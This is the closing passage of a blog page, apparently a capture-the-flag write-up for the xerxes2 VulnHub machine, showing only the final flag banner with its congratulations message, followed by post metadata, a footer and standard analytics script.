</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>  congratulations on beating xerxes2!
</span><span class='line'>
</span><span class='line'>  I hope you enjoyed it as much as I did making xerxes2.
</span><span class='line'>  xerxes1 has been described as <span class="s1">&#39;weird&#39;</span> and <span class="s1">&#39;left-field&#39;</span>
</span><span class='line'>  and I hope that this one fits that description too :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>  Many thanks to @TheColonial <span class="p">&amp;</span> @rasta_mouse <span class="k">for</span> testing!
</span><span class='line'>
</span><span class='line'>  Ping me on <span class="c">#vulnhub for thoughts and comments!</span>
</span><span class='line'>
</span><span class='line'>                    @barrebas, July 2014
</span><span class='line'>root@xerxes2:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://www.awesomelyluvvie.com/wp-content/uploads/2013/01/CharlieBrownDance2.gif" alt="" /></p>
</div>


<div class="meta">
	<div class="date">








  


<time datetime="2014-08-08T13:16:46+01:00" pubdate data-updated="true"></time></div>
	<div class="tags">


	<a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>


</div>
	
</div>
</article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
		
		
		<a class="addthis_button_tweet"></a>
		
		
		
	</div>
	
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    recrudesce

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->




	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-52976545-1']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>



</body>
</html>